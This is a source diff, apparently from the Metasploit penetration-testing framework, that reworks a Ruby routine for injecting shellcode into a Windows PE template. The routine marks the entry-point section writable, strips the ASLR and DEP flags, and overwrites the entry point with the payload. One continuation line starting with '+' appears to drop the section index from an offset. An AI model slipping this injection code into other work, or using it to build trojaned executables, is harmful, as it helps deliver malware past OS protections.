@@ -293,62 +293,45 @@ require 'msf/core/exe/segment_injector'
     # Allow the user to specify their own EXE template
     set_template_default(opts, "template_#{arch}_windows.exe")
 
-    pe = Rex::PeParsey::Pe.new_from_file(opts[:template], true)
+    pe = Rex::PeParsey::Pe
 
-    exe = ''
-    File.open(opts[:template], 'rb') {|fd| exe = fd.read(fd.stat.size)}
+    exe = pe.new_from_file(opts[:template], true)
 
-    pe_header_size = 0x18
-    entryPoint_offset = 0x28
-    section_size = 0x28
-    characteristics_offset = 0x24
-    virtualAddress_offset = 0x0c
-    sizeOfRawData_offset = 0x10
+    rawexe = ''
+    File.open(opts[:template], 'rb') { |fd|
+      rawexe = fd.read(fd.stat.size)
+    }
 
-    sections_table_offset =
-      pe._dos_header.v['e_lfanew'] +
-      pe._file_header.v['SizeOfOptionalHeader'] +
-      pe_header_size
+    offset_optionalHeader      = exe._dos_header.e_lfanew + pe::IMAGE_FILE_HEADER_SIZE
+    offset_addressOfEntryPoint = offset_optionalHeader   + pe::SO_ADDRESS_OF_ENTRY_POINT
+    offset_sectionHeaders      = offset_optionalHeader   + exe._file_header.SizeOfOptionalHeader
+    offset_dllCharacteristics  = offset_optionalHeader   + pe::SO_DLL_CHARACTERISTICS
 
-    sections_table_characteristics_offset = sections_table_offset + characteristics_offset
+    addressOfEntryPoint = exe.hdr.opt.AddressOfEntryPoint
 
-    sections_header = []
-    pe._file_header.v['NumberOfSections'].times do |i|
-      section_offset = sections_table_offset + (i * section_size)
-      sections_header << [
-        sections_table_characteristics_offset + (i * section_size),
-        exe[section_offset,section_size]
-      ]
+    # set entry point's section writable
+    exe.sections.each_with_index do |section, index|
+      next unless section.contains_rva?(addressOfEntryPoint)
+      offset_sectionCharacteristics = offset_sectionHeaders + pe::SO_SECTION_CHARACTERISTICS
+                                                            + pe::IMAGE_SIZEOF_SECTION_HEADER * index
+      new_sectionCharacteristics = section.flags | pe::IMAGE_SCN_MEM_WRITE
+      rawexe[offset_sectionCharacteristics, 4] = [new_sectionCharacteristics].pack('V')
+      break
     end
 
-    addressOfEntryPoint = pe.hdr.opt.AddressOfEntryPoint
+    # remove dllCharacteristics "security" flags (ASLR and permanent DEP for instance)
+    new_dllCharacteristics = exe._optional_header.v['DllCharacteristics'] & pe::IMAGE_DLL_CHARACTERISTICS_NO_SECURITY
+    rawexe[offset_dllCharacteristics, 2] = [new_dllCharacteristics].pack('S')
+    importsVA = exe._optional_header['DataDirectory'][pe::IMAGE_DIRECTORY_ENTRY_IMPORT].v['VirtualAddress']
 
-    # look for section with entry point
-    sections_header.each do |sec|
-      virtualAddress = sec[1][virtualAddress_offset,0x4].unpack('V')[0]
-      sizeOfRawData = sec[1][sizeOfRawData_offset,0x4].unpack('V')[0]
-      characteristics = sec[1][characteristics_offset,0x4].unpack('V')[0]
-
-      if (virtualAddress...virtualAddress+sizeOfRawData).include?(addressOfEntryPoint)
-        importsTable = pe.hdr.opt.DataDirectory[8..(8+4)].unpack('V')[0]
-        if (importsTable - addressOfEntryPoint) < code.length
-          #shift original entry point to prevent tables overwritting
-          addressOfEntryPoint = importsTable - code.length + 4
-
-          entry_point_offset = pe._dos_header.v['e_lfanew'] + entryPoint_offset
-          exe[entry_point_offset,4] = [addressOfEntryPoint].pack('V')
-        end
-        # put this section writable
-        characteristics |= 0x8000_0000
-        newcharacteristics = [characteristics].pack('V')
-        exe[sec[0],newcharacteristics.length] = newcharacteristics
-      end
+    # shift original entry point to prevent tables overwritting
+    if (importsVA - addressOfEntryPoint) < code.length
+      addressOfEntryPoint = importsVA - (code.length + 4)
+      rawexe[offset_addressOfEntryPoint, 4] = [addressOfEntryPoint].pack('V')
     end
-
-    # put the shellcode at the entry point, overwriting template
-    entryPoint_file_offset = pe.rva_to_file_offset(addressOfEntryPoint)
-    exe[entryPoint_file_offset,code.length] = code
-    exe
+    offset_entryPoint = exe.rva_to_file_offset(addressOfEntryPoint)
+    rawexe[offset_entryPoint, code.length] = code
+    return rawexe
   end
 
   def self.to_win32pe_old(framework, code, opts = {})
